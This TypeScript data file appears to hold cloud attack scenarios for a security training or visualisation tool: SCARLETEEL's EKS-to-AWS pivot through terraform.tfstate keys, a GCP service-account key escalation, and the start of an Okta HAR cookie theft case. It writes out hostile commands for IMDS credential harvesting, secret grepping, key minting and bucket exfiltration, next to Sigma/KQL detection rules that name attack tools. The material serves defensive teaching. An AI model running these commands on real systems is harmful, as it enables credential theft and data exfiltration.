  name: 'Sysdig TRT, Permiso & Unit 42 — SCARLETEEL Operation: Kubernetes Pod RCE, AWS Terraform .tfstate Theft & Pacu Pivot',
  shortSubtitle: 'Sysdig Threat Research · Permiso P0 Labs · EKS Pod RCE -> IMDS -> S3 terraform.tfstate Plaintext Keys -> Cross-Account Pivot',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 6,
  overview:
    'Uncovered by the Sysdig Threat Research Team (TRT) and analyzed alongside Permiso P0 Labs and Unit 42, SCARLETEEL is an advanced cloud-native intrusion operation targeting Kubernetes (EKS) clusters and AWS environments to steal proprietary source code and cloud infrastructure. After exploiting a public-facing containerized workload in Kubernetes, SCARLETEEL queries the node/pod metadata service for initial IAM role credentials, locates unencrypted Terraform state files (terraform.tfstate) stored in S3 buckets, extracts plaintext AWS IAM access keys for interconnected production accounts from the .tfstate JSON, and uses the Pacu framework and TruffleHog for cross-account intellectual property theft.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Sysdig Threat Research Team (SCARLETEEL & SCARLETEEL 2.0) · Permiso P0 Labs · Unit 42 Cloud Report',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Container Workload RCE) · T1552.001 (Credentials in terraform.tfstate) · T1078.004 (Cross-Account AWS Pivot)',
    },
    {
      term: 'HIGH-VALUE ARTIFACT',
      value: 's3://corp-infra-tfstate/prod/terraform.tfstate (Plaintext aws_iam_access_key secrets)',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'Sysdig Falco Container Exec + CloudTrail GetObject (terraform.tfstate) + Pacu User-Agent',
    },
  ],
  nodes: [
    {
      id: 'scarleteel_operator',
      label: 'SCARLETEEL Cloud Operator',
      sublabel: '198.51.100.162 (Pacu & TruffleHog C2)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'Cloud-Native Intrusion Operator (Pacu Framework)',
        pidOrPort: 'HTTPS :443 (Kubernetes Ingress & AWS S3/IAM APIs)',
        privilege: 'External Exploiter -> Multi-Account AWS Admin',
        artifacts: [
          'exploit_pod_rce.sh (curl / aws-cli / kubectl / trufflehog)',
          'Pacu session User-Agent: Boto3/1.26.x Python/3.10 Linux/kali',
        ],
        description:
          'Targets exposed Kubernetes workloads to pivot into underlying AWS accounts and steal proprietary ML/software IP.',
      },
    },
    {
      id: 'eks_compromised_pod',
      label: 'EKS Workload Pod (Spring/Jupyter)',
      sublabel: '10.100.14.28 (pod/ml-notebook-prod-6d8f9)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Kubernetes Pod on AWS EKS (Ubuntu 22.04 Container)',
        pidOrPort: 'PID 412 (/bin/bash reconnaissance script)',
        privilege: 'ServiceAccount Token + EC2 Node IAM Role',
        artifacts: [
          '/var/run/secrets/kubernetes.io/serviceaccount/token',
          'http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role',
        ],
        description:
          'Publicly reachable Kubernetes workload exploited for initial shell execution inside the AWS EKS cluster.',
      },
    },
    {
      id: 's3_terraform_state_bucket',
      label: 'S3 Terraform State Backend',
      sublabel: 's3://corp-devops-tfstate-prod/terraform.tfstate',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Amazon S3 Bucket Storing Infrastructure-as-Code State',
        pidOrPort: 's3:GetObject (terraform.tfstate JSON)',
        privilege: 'Readable by EKS Node / DevOps Role',
        artifacts: [
          'resources[].type == "aws_iam_access_key" -> attributes.secret (Plaintext AKIA/Secret)',
          'Database master_password & Peered AWS Account IDs',
        ],
        description:
          'Terraform state file storing a complete plaintext JSON map of the organization’s cloud architecture and created IAM secret keys.',
      },
    },
    {
      id: 'peered_prod_aws_account',
      label: 'Peered Production AWS Account',
      sublabel: 'Account 987654321098 (S3 IP & Lambda Code)',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Production AWS Account (Proprietary Source & S3)',
        pidOrPort: 'STS GetCallerIdentity / S3 Sync / Lambda GetFunction',
        privilege: 'Organization-Admin IAM Key from .tfstate',
        artifacts: [
          'aws lambda list-functions & aws s3 sync s3://proprietary-algorithms-prod',
          'Pacu iam__enum_permissions &iam__backdoor_users_keys',
        ],
        description:
          'Core production AWS account compromised using plaintext IAM access keys harvested from the S3 Terraform state file.',
      },
    },
    {
      id: 'sysdig_and_cloudtrail_siem',
      label: 'Sysdig Secure & AWS CloudTrail SIEM',
      sublabel: 'Falco Container Drift + .tfstate Access Alert',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Sysdig Runtime eBPF & CloudTrail Correlation Engine',
        pidOrPort: 'Falco Binary Drift + S3 Data Events',
        privilege: 'CNAPP & CDR Detection Plane',
        artifacts: [
          'Falco: Download and execute aws-cli / kubectl inside running container',
          'CloudTrail: GetObject on *terraform.tfstate* followed by Pacu enumeration',
        ],
        description:
          'Correlates in-container binary downloads (aws-cli/trufflehog) with S3 GetObject calls on .tfstate files.',
      },
    },
  ],
  processTree: [
    {
      pid: 412,
      ppid: 1,
      name: 'bash (SCARLETEEL Pod Recon)',
      commandLine: '/bin/bash -c "curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/eks-node-role && aws s3 cp s3://corp-devops-tfstate-prod/terraform.tfstate - | grep -E \'secret|password|AKIA\'"',
      user: 'root',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: [
        'connect("169.254.169.254:80")',
        'execve("/usr/local/bin/aws", ["aws", "s3", "cp", "s3://.../terraform.tfstate", "-"])',
      ],
      memoryBlocks: [
        {
          address: '0x00007F4190800000',
          section: 'Pipe Buffer (Parsed terraform.tfstate JSON)',
          permissions: 'RW-',
          size: '512 KB',
          status: 'injected',
          description: 'In-memory stream of terraform.tfstate exposing plaintext aws_iam_access_key secret values.',
          hexPreview: '22 74 79 70 65 22 3A 20 22 61 77 73 5F 69 61 6D ("type": "aws_iam_access_key", "secret": "...)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'KUBERNETES POD RCE & NODE IMDS CREDENTIAL HARVESTING',
      subtitle: 'Exploiting an exposed EKS container workload and querying 169.254.169.254 for node IAM credentials',
      description:
        'SCARLETEEL exploits an internet-facing container pod running in Amazon EKS, downloads static reconnaissance binaries (aws-cli, kubectl, trufflehog) into /tmp, and queries both /var/run/secrets/kubernetes.io/serviceaccount/token and the EC2 worker node’s IMDS endpoint (169.254.169.254) to harvest temporary IAM role credentials.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application (EKS Pod)',
      activeNodeIds: ['scarleteel_operator', 'eks_compromised_pod', 'sysdig_and_cloudtrail_siem'],
      compromisedNodeIds: ['eks_compromised_pod'],
      keySpecs: [
        { term: 'INITIAL FOOTHOLD', value: 'Exposed Kubernetes Workload Pod in AWS EKS' },
        { term: 'HARVESTED TOKENS', value: 'K8s ServiceAccount JWT + EC2 Node Role STS Credentials' },
        { term: 'RUNTIME DRIFT', value: 'curl downloading aws-cli & trufflehog into container /tmp' },
      ],
    },
    {
      index: 2,
      title: 'S3 TERRAFORM STATE (.TFSTATE) PLAINTEXT SECRET EXTRACTION',
      subtitle: 'Downloading terraform.tfstate from S3 to recover plaintext aws_iam_access_key secrets',
      description:
        'Using the EKS node’s IAM role, the attacker lists S3 buckets and locates s3://corp-devops-tfstate-prod/terraform.tfstate. Because Terraform stores resource attributes in cleartext JSON inside state files, parsing aws_iam_access_key and aws_db_instance blocks reveals permanent AKIA access keys and secrets for privileged admin accounts.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1552.001',
      mitreTechniqueName: 'Unsecured Credentials: Credentials In Files (terraform.tfstate)',
      activeNodeIds: ['eks_compromised_pod', 's3_terraform_state_bucket', 'sysdig_and_cloudtrail_siem'],
      compromisedNodeIds: ['eks_compromised_pod', 's3_terraform_state_bucket'],
      keySpecs: [
        { term: 'TARGET ARTIFACT', value: 's3://corp-devops-tfstate-prod/terraform.tfstate' },
        { term: 'TERRAFORM RESOURCE', value: 'aws_iam_access_key.attributes.id & attributes.secret' },
        { term: 'ARCHITECTURAL RISK', value: 'Terraform state files store created IAM secrets in plaintext JSON' },
      ],
    },
    {
      index: 3,
      title: 'CROSS-ACCOUNT PACU PIVOT & PROPRIETARY CODE EXFILTRATION',
      subtitle: 'Replaying .tfstate admin keys in Pacu to backdoor IAM users and dump proprietary S3/Lambda code',
      description:
        'Armed with the permanent AKIA admin keys from terraform.tfstate, SCARLETEEL imports them into the Pacu cloud exploitation framework, pivots into peered production AWS accounts, runs iam__backdoor_users_keys for persistence, and exfiltrates proprietary Lambda deployment packages and S3 intellectual property.',
      mitreTacticPhase: 6,
      mitreTechniqueId: 'T1078.004',
      mitreTechniqueName: 'Valid Accounts: Cloud Accounts',
      activeNodeIds: ['scarleteel_operator', 's3_terraform_state_bucket', 'peered_prod_aws_account', 'sysdig_and_cloudtrail_siem'],
      compromisedNodeIds: ['eks_compromised_pod', 's3_terraform_state_bucket', 'peered_prod_aws_account'],
      keySpecs: [
        { term: 'EXPLOITATION FRAMEWORK', value: 'Pacu (iam__enum_permissions / iam__backdoor_users_keys)' },
        { term: 'EXFILTRATED ASSETS', value: 'Lambda GetFunction (.zip code) & Proprietary S3 Models' },
        { term: 'DEFENSIVE FIX', value: 'Set HopLimit=1 on EKS Nodes + Restrict S3 .tfstate Bucket via KMS/IAM' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'scarleteel-1',
      no: 1,
      stageIndex: 1,
      timestamp: '04:11:29.308',
      sourceNodeId: 'scarleteel_operator',
      targetNodeId: 'eks_compromised_pod',
      sourceLabel: 'SCARLETEEL Operator',
      targetLabel: 'EKS Workload Pod',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'FALCO CONTAINER_DRIFT',
      shortAction: 'IN_CONTAINER_TOOL_DROP',
      info: 'container=ml-notebook-prod proc=curl args="-sL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/aws.zip"',
      sizeOrCode: 'FALCO WARNING',
      severity: 'HIGH',
      mitreId: 'T1190',
      explanation: 'Sysdig Falco detects runtime container drift as the attacker downloads AWS CLI and TruffleHog inside an EKS pod.',
      rawLog: `04:11:29.308112000: Warning New executable downloaded and executed inside container (user=root pod=ml-notebook-prod-6d8f9 ns=prod cmdline=curl -sL https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip -o /tmp/aws.zip)`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Sysdig Falco Runtime Container Drift & Cloud CLI Execution in Pod',
        ruleCode: `rule: Cloud CLI Executed Inside Production Container
condition: spawned_process and container and proc.name in (aws, gcloud, az, trufflehog, pacu)
output: "Cloud reconnaissance binary executed in container (pod=%k8s.pod.name cmd=%proc.cmdline)"`,
        mitigation: 'Enforce immutable container filesystems (readOnlyRootFilesystem: true) and block pod access to node IMDS via HttpPutResponseHopLimit=1.',
      },
    },
    {
      id: 'scarleteel-2',
      no: 2,
      stageIndex: 2,
      timestamp: '04:13:02.640',
      sourceNodeId: 'eks_compromised_pod',
      targetNodeId: 's3_terraform_state_bucket',
      sourceLabel: 'EKS Pod (eks-node-role)',
      targetLabel: 'S3 Terraform State Bucket',
      sourceType: 'NETWORK',
      protocolOrEventId: 'CLOUDTRAIL S3 GetObject',
      shortAction: 'TERRAFORM_TFSTATE_READ',
      info: 'AssumedRole=eks-node-role eventName=GetObject bucketName=corp-devops-tfstate-prod key=prod/terraform.tfstate',
      sizeOrCode: '1.8 MB JSON',
      severity: 'CRITICAL',
      mitreId: 'T1552.001',
      explanation: 'Compromised EKS node role downloads the production terraform.tfstate file from S3 to harvest plaintext IAM keys.',
      rawLog: `{"eventSource":"s3.amazonaws.com","eventName":"GetObject","userIdentity":{"type":"AssumedRole","arn":"arn:aws:sts::111122223333:assumed-role/eks-node-role/i-09912a3bc"},"requestParameters":{"bucketName":"corp-devops-tfstate-prod","key":"prod/terraform.tfstate"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'SCARLETEEL S3 Terraform State (.tfstate) Access by Non-CI/CD Role',
        ruleCode: `title: Suspicious S3 GetObject on Terraform State File
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    eventSource: 's3.amazonaws.com'
    eventName: 'GetObject'
    requestParameters.key|endswith: '.tfstate'
  condition: selection`,
        mitigation: 'Isolate Terraform state buckets with strict S3 Bucket Policies allowing access only to dedicated CI/CD roles, and never create raw aws_iam_access_key resources in Terraform.',
      },
    },
    {
      id: 'scarleteel-3',
      no: 3,
      stageIndex: 3,
      timestamp: '04:16:50.119',
      sourceNodeId: 'scarleteel_operator',
      targetNodeId: 'peered_prod_aws_account',
      sourceLabel: 'SCARLETEEL (Pacu)',
      targetLabel: 'Peered Prod Account',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'CLOUDTRAIL CreateAccessKey',
      shortAction: 'PACU_CROSS_ACCOUNT_BACKDOOR',
      info: 'User=terraform-org-admin eventName=CreateAccessKey & GetFunction sourceIP=198.51.100.162 userAgent="Boto3/1.26.90 Python/3.10.12 Linux/6.1.0-kali"',
      sizeOrCode: 'CROSS_ACCOUNT_COMPROMISE',
      severity: 'CRITICAL',
      mitreId: 'T1078.004',
      explanation: 'Attacker replays the plaintext IAM key extracted from terraform.tfstate using Pacu on Kali Linux to mint persistent keys and download Lambda code.',
      rawLog: `{"eventSource":"iam.amazonaws.com","eventName":"CreateAccessKey","awsRegion":"us-east-1","sourceIPAddress":"198.51.100.162","userAgent":"Boto3/1.26.90 Python/3.10.12 Linux/6.1.0-kali9-amd64","userIdentity":{"type":"IAMUser","userName":"terraform-org-admin"}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Pacu / Kali Linux User-Agent Executing AWS IAM CreateAccessKey',
        ruleCode: `title: AWS IAM API Call From Kali Linux or Pacu Framework
logsource:
  product: aws
  service: cloudtrail
detection:
  selection:
    userAgent|contains:
      - 'kali'
      - 'parrot'
      - 'pacu'
  condition: selection`,
        mitigation: 'Rotate all secrets present in exposed .tfstate files and migrate cross-account Terraform pipelines to OIDC short-lived AssumeRole sessions.',
      },
    },
  ],
};

export const GCP_SERVICE_ACCOUNT_HMAC_KEY_PIVOT_SCENARIO: AttackScenario = {
  id: 'gcp-service-account-hmac-key-pivot',
  code: 'T1098.001',
  name: 'Mandiant, Wiz & Google Cloud — GCP iam.serviceAccountKeys.create & serviceAccounts.actAs Impersonation Escalation',
  shortSubtitle: 'Mandiant · Wiz · Rhino Security Labs · iam.serviceAccountKeys.create · Default Compute SA Editor Pivot & GCS Exfil',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 3,
  overview:
    'Analyzed by Mandiant (Google Cloud Threat Intelligence), Wiz Research, and Rhino Security Labs, Google Cloud Platform (GCP) identity privilege escalation frequently exploits two high-blast-radius IAM permissions: iam.serviceAccountKeys.create and iam.serviceAccounts.actAs. When an attacker compromises a build or workload identity granted Service Account Key Admin or Service Account User over the project’s privileged Default Compute Engine Service Account (<project-number>-compute@developer.gserviceaccount.com, which historically defaults to roles/editor), the attacker generates a persistent JSON private key or mints an OAuth2 access token via generateAccessToken to exfiltrate Cloud Storage (GCS) buckets and BigQuery datasets.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Mandiant / Google Cloud IAM Hardening · Wiz Cloud Attack Path Research · Rhino Security Labs GCP PriVesc',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1098.001 (Additional Cloud Credentials: SA Key Creation) · T1550.001 (Application Access Token) · T1530 (Cloud Storage)',
    },
    {
      term: 'GCP PERMISSIONS ABUSED',
      value: 'iam.serviceAccountKeys.create & iam.serviceAccounts.actAs / iam.serviceAccounts.getAccessToken',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'GCP Cloud Audit Logs (Admin Activity): google.iam.admin.v1.CreateServiceAccountKey',
    },
  ],
  nodes: [
    {
      id: 'gcp_compromised_ci_caller',
      label: 'Compromised GCP Workload Caller',
      sublabel: '198.51.100.73 (ci-runner@corp-prod.iam)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary Using gcloud CLI',
        pidOrPort: 'HTTPS :443 (iam.googleapis.com)',
        privilege: 'roles/iam.serviceAccountKeyAdmin on Project',
        artifacts: [
          'gcloud iam service-accounts list',
          'gcloud iam service-accounts keys create loot_key.json',
        ],
        description:
          'Attacker holding a compromised low-tier CI service account that has key-creation rights over other service accounts in the project.',
      },
    },
    {
      id: 'gcp_iam_admin_api',
      label: 'GCP IAM Control Plane API',
      sublabel: 'iam.googleapis.com (CreateServiceAccountKey)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Google Cloud IAM & IAMCredentials Service',
        pidOrPort: 'POST /v1/projects/corp-prod/serviceAccounts/.../keys',
        privilege: 'Mints RSA-2048 User-Managed JSON Key',
        artifacts: [
          'methodName: google.iam.admin.v1.CreateServiceAccountKey',
          'private_key_id: 9f8e7d6c5b4a32109876543210fedcba98765432',
        ],
        description:
          'Issues a persistent user-managed RSA private key JSON file for the target service account.',
      },
    },
    {
      id: 'default_compute_editor_sa',
      label: 'Default Compute Service Account',
      sublabel: '482910492810-compute@developer.gserviceaccount.com',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'GCP Privileged Service Account Identity',
        pidOrPort: 'OAuth2 Bearer Token (ya29.c.b0Aaekm1...)',
        privilege: 'roles/editor (Project-Wide Read/Write)',
        artifacts: [
          'gcloud auth activate-service-account --key-file=loot_key.json',
          'Inherited roles/editor across all project GCS & BigQuery resources',
        ],
        description:
          'Legacy Default Compute Engine Service Account pre-configured with project-wide Editor permissions.',
      },
    },
    {
      id: 'gcp_gcs_bigquery_vault',
      label: 'GCP Cloud Storage & BigQuery Prod',
      sublabel: 'gs://corp-financial-ledger-prod',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Google Cloud Storage (GCS) & BigQuery Data Warehouse',
        pidOrPort: 'storage.objects.get / gcloud storage cp -r',
        privilege: 'Accessible via Default Compute SA (roles/editor)',
        artifacts: [
          'gcloud storage cp -r gs://corp-financial-ledger-prod ./dump/',
          'Data Access Audit Log: storage.objects.get on 8,900 objects',
        ],
        description:
          'Production GCS buckets and BigQuery tables exfiltrated using the newly minted Default Compute SA key.',
      },
    },
    {
      id: 'gcp_scc_cloud_audit_siem',
      label: 'Google Cloud SCC & Chronicle SIEM',
      sublabel: 'CreateServiceAccountKey + OrgPolicy Monitor',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'Security Command Center (SCC) & Cloud Audit Logs',
        pidOrPort: 'cloudaudit.googleapis.com/activity',
        privilege: 'GCP Security Operations & OrgPolicy Guardrail',
        artifacts: [
          'SCC Finding: Persistence: IAM Anomalous Service Account Key Created',
          'OrgPolicy: constraints/iam.disableServiceAccountKeyCreation',
        ],
        description:
          'Alerts on user-managed service account key creation and cross-IP service account key authentication.',
      },
    },
  ],
  processTree: [
    {
      pid: 8104,
      ppid: 2100,
      name: 'gcloud (GCP SDK CLI)',
      commandLine: 'gcloud iam service-accounts keys create loot_key.json --iam-account=482910492810-compute@developer.gserviceaccount.com',
      user: 'attacker',
      integrity: 'High',
      status: 'malicious',
      activeFromStage: 1,
      apiCalls: [
        'POST https://iam.googleapis.com/v1/projects/corp-prod/serviceAccounts/.../keys',
        'POST https://oauth2.googleapis.com/token (grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer)',
      ],
      memoryBlocks: [
        {
          address: '0x00007F1108400000',
          section: 'loot_key.json (RSA Private Key Buffer)',
          permissions: 'RW-',
          size: '8 KB',
          status: 'injected',
          description: 'Downloaded GCP service account JSON key file containing PKCS#8 private_key for the Editor service account.',
          hexPreview: '7B 0A 20 20 22 74 79 70 65 22 3A 20 22 73 65 72 ({"type": "service_account", "private_key": "...)',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'ENUMERATING PRIVILEGED DEFAULT COMPUTE SERVICE ACCOUNT',
      subtitle: 'Identifying 482910492810-compute@developer.gserviceaccount.com with project-wide roles/editor',
      description:
        'Using a compromised CI/CD service account, the attacker queries the GCP IAM API to enumerate service accounts in the project and identifies the Default Compute Engine Service Account (482910492810-compute@developer.gserviceaccount.com), which holds the broad primitive role roles/editor.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1087.004',
      mitreTechniqueName: 'Account Discovery: Cloud Account',
      activeNodeIds: ['gcp_compromised_ci_caller', 'gcp_iam_admin_api', 'gcp_scc_cloud_audit_siem'],
      compromisedNodeIds: ['gcp_iam_admin_api'],
      keySpecs: [
        { term: 'TARGET IDENTITY', value: '482910492810-compute@developer.gserviceaccount.com' },
        { term: 'ATTACHED ROLE', value: 'roles/editor (Project-Wide Read/Write Primitive Role)' },
        { term: 'PRIVESC PERMISSION', value: 'iam.serviceAccountKeys.create (or iam.serviceAccounts.actAs)' },
      ],
    },
    {
      index: 2,
      title: 'MINTING USER-MANAGED RSA JSON KEY VIA CREATESERVICEACCOUNTKEY',
      subtitle: 'Calling google.iam.admin.v1.CreateServiceAccountKey to download a persistent private key',
      description:
        'Because the compromised caller possesses iam.serviceAccountKeys.create at the project level (rather than scoped only to its own account), it invokes gcloud iam service-accounts keys create to generate a new user-managed RSA-2048 private key (loot_key.json) for the Default Compute Service Account.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1098.001',
      mitreTechniqueName: 'Account Manipulation: Additional Cloud Credentials',
      activeNodeIds: ['gcp_iam_admin_api', 'default_compute_editor_sa', 'gcp_scc_cloud_audit_siem'],
      compromisedNodeIds: ['gcp_iam_admin_api', 'default_compute_editor_sa'],
      keySpecs: [
        { term: 'AUDIT LOG METHOD', value: 'google.iam.admin.v1.CreateServiceAccountKey' },
        { term: 'CREDENTIAL TYPE', value: 'USER_MANAGED JSON Private Key (PKCS#8 RSA-2048)' },
        { term: 'OAUTH EXCHANGE', value: 'Signed JWT exchanged at oauth2.googleapis.com/token for ya29.* token' },
      ],
    },
    {
      index: 3,
      title: 'IMPERSONATED EDITOR AUTHENTICATION & GCS BUCKET EXFILTRATION',
      subtitle: 'Activating loot_key.json to inherit roles/editor and bulk-download gs://corp-financial-ledger-prod',
      description:
        'The attacker activates loot_key.json via gcloud auth activate-service-account, mints an OAuth2 access token (ya29.*) carrying full roles/editor privileges, and runs gcloud storage cp -r gs://corp-financial-ledger-prod to exfiltrate sensitive cloud storage buckets.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1530',
      mitreTechniqueName: 'Data from Cloud Storage',
      activeNodeIds: ['default_compute_editor_sa', 'gcp_gcs_bigquery_vault', 'gcp_scc_cloud_audit_siem'],
      compromisedNodeIds: ['gcp_iam_admin_api', 'default_compute_editor_sa', 'gcp_gcs_bigquery_vault'],
      keySpecs: [
        { term: 'EXFIL COMMAND', value: 'gcloud storage cp -r gs://corp-financial-ledger-prod ./dump/' },
        { term: 'DATA ACCESS LOG', value: 'storage.objects.get by 482910492810-compute@developer.gserviceaccount.com' },
        { term: 'ORG POLICY FIX', value: 'Enforce constraints/iam.disableServiceAccountKeyCreation + constraints/iam.automaticIamGrantsForDefaultServiceAccounts' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'gcp-sa-1',
      no: 1,
      stageIndex: 1,
      timestamp: '21:05:11.090',
      sourceNodeId: 'gcp_compromised_ci_caller',
      targetNodeId: 'gcp_iam_admin_api',
      sourceLabel: 'ci-runner@corp-prod.iam',
      targetLabel: 'GCP IAM API',
      sourceType: 'NETWORK',
      protocolOrEventId: 'GCP ADMIN_ACTIVITY',
      shortAction: 'LIST_SERVICE_ACCOUNTS',
      info: 'methodName=google.iam.admin.v1.ListServiceAccounts principalEmail=ci-runner@corp-prod.iam.gserviceaccount.com',
      sizeOrCode: 'HTTP 200',
      severity: 'MEDIUM',
      mitreId: 'T1087.004',
      explanation: 'Attacker enumerates all service accounts in the GCP project to locate over-privileged default service accounts.',
      rawLog: `{"protoPayload":{"@type":"type.googleapis.com/google.cloud.audit.AuditLog","serviceName":"iam.googleapis.com","methodName":"google.iam.admin.v1.ListServiceAccounts","authenticationInfo":{"principalEmail":"ci-runner@corp-prod.iam.gserviceaccount.com"},"requestMetadata":{"callerIp":"198.51.100.73"}}}`,
      detectionRule: {
        type: 'KQL',
        title: 'GCP Service Account Enumeration from External Non-Cloud IP',
        ruleCode: `gcp_cloudaudit_activity | where methodName == "google.iam.admin.v1.ListServiceAccounts" and not(ipv4_is_in_range(callerIp, "34.0.0.0/8"))`,
        mitigation: 'Enforce VPC Service Controls (VPC-SC) perimeters around IAM and Cloud Storage APIs.',
      },
    },
    {
      id: 'gcp-sa-2',
      no: 2,
      stageIndex: 2,
      timestamp: '21:05:18.442',
      sourceNodeId: 'gcp_iam_admin_api',
      targetNodeId: 'default_compute_editor_sa',
      sourceLabel: 'GCP IAM API',
      targetLabel: 'Default Compute SA',
      sourceType: 'IDS_ALERT',
      protocolOrEventId: 'GCP CreateServiceAccountKey',
      shortAction: 'USER_MANAGED_SA_KEY_CREATED',
      info: 'methodName=google.iam.admin.v1.CreateServiceAccountKey resourceName=.../482910492810-compute@developer.gserviceaccount.com',
      sizeOrCode: 'KEY_ID 9f8e7d6c5b',
      severity: 'CRITICAL',
      mitreId: 'T1098.001',
      explanation: 'A lower-privileged CI service account creates a persistent JSON private key for the Editor-level Default Compute Service Account.',
      rawLog: `{"protoPayload":{"serviceName":"iam.googleapis.com","methodName":"google.iam.admin.v1.CreateServiceAccountKey","authenticationInfo":{"principalEmail":"ci-runner@corp-prod.iam.gserviceaccount.com"},"resourceName":"projects/corp-prod/serviceAccounts/482910492810-compute@developer.gserviceaccount.com","requestMetadata":{"callerIp":"198.51.100.73","callerSuppliedUserAgent":"google-cloud-sdk gcloud/462.0.1"}}}`,
      detectionRule: {
        type: 'SIGMA',
        title: 'GCP User-Managed Service Account Key Created for Privileged Account',
        ruleCode: `title: GCP CreateServiceAccountKey Audit Alert
logsource:
  product: gcp
  service: gcp.audit
detection:
  selection:
    data.protoPayload.methodName: 'google.iam.admin.v1.CreateServiceAccountKey'
  condition: selection`,
        mitigation: 'Enable GCP Organization Policy constraints/iam.disableServiceAccountKeyCreation and constraints/iam.automaticIamGrantsForDefaultServiceAccounts.',
      },
    },
    {
      id: 'gcp-sa-3',
      no: 3,
      stageIndex: 3,
      timestamp: '21:06:40.715',
      sourceNodeId: 'default_compute_editor_sa',
      targetNodeId: 'gcp_gcs_bigquery_vault',
      sourceLabel: 'Impersonated Compute SA',
      targetLabel: 'GCS Bucket (corp-financial-ledger)',
      sourceType: 'NETWORK',
      protocolOrEventId: 'GCP DATA_ACCESS storage.objects.get',
      shortAction: 'GCS_BULK_DOWNLOAD',
      info: 'principalEmail=482910492810-compute@developer.gserviceaccount.com methodName=storage.objects.get callerIp=198.51.100.73',
      sizeOrCode: '8,900 Objects Read',
      severity: 'CRITICAL',
      mitreId: 'T1530',
      explanation: 'Default Compute Engine Service Account is used from an external IP (198.51.100.73) outside GCE to bulk-download GCS objects.',
      rawLog: `{"protoPayload":{"serviceName":"storage.googleapis.com","methodName":"storage.objects.get","resourceName":"projects/_/buckets/corp-financial-ledger-prod/objects/q4_settlements.parquet","authenticationInfo":{"principalEmail":"482910492810-compute@developer.gserviceaccount.com","serviceAccountKeyName":"//iam.googleapis.com/projects/corp-prod/serviceAccounts/482910492810-compute@developer.gserviceaccount.com/keys/9f8e7d6c5b4a"},"requestMetadata":{"callerIp":"198.51.100.73"}}}`,
      detectionRule: {
        type: 'KQL',
        title: 'GCP Default Compute Service Account Authenticated Using Static Key Outside GCE',
        ruleCode: `gcp_cloudaudit_data_access | where principalEmail endswith "-compute@developer.gserviceaccount.com" and isnotempty(serviceAccountKeyName)`,
        mitigation: 'Delete all user-managed keys on *-compute@developer.gserviceaccount.com and alert whenever serviceAccountKeyName is non-empty.',
      },
    },
  ],
};

export const OKTA_HAR_FILE_SESSION_TOKEN_HIJACK_SCENARIO: AttackScenario = {
  id: 'okta-har-file-session-token-hijack',
  code: 'T1539',
  name: 'Okta Security, Cloudflare & BeyondTrust — Support Case .har File sid Session Token Theft & Admin API Token Minting',
  shortSubtitle: 'Okta Security · Cloudflare SIRT · BeyondTrust · HTTP Archive (.har) Cookie: sid=... Replay · Post-MFA Admin Hijack',
  category: 'CLOUD_SAAS',
  severity: 'CRITICAL',
  primaryMitrePhase: 5,
  overview:
    'Documented by Okta Security, Cloudflare SIRT, BeyondTrust, and 1Password (October–November 2023), a threat actor compromised Okta’s customer support case-management system and downloaded HTTP Archive (.har) troubleshooting files uploaded by enterprise administrators. Because browser .har captures record raw HTTP request headers including live Cookie: sid=<session_token> values from authenticated admin sessions, the attacker replayed the stolen sid cookie from anonymizing VPN nodes within minutes—bypassing passwords and MFA—to access the victim’s Okta Admin Console, create backdoor Super Administrator accounts, and mint permanent SSWS API tokens.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Okta Security Advisory (Support System Incident) · Cloudflare SIRT Post-Mortem · BeyondTrust Incident Report',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1539 (Steal Web Session Cookie: .har sid) · T1550.004 (Web Session Cookie Replay) · T1098.001 (Okta SSWS API Token Creation)',
    },
    {
      term: 'STOLEN ARTIFACT',
      value: 'Unsanitized Browser HTTP Archive (.har) Containing Cookie: sid=102f8a9c...',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'Okta System Log: user.session.access_admin_app (New ASN/IP on existing externalSessionId) & system.api_token.create',
    },
  ],
  nodes: [
    {
      id: 'har_token_thief_actor',
      label: 'Support Case Threat Actor',
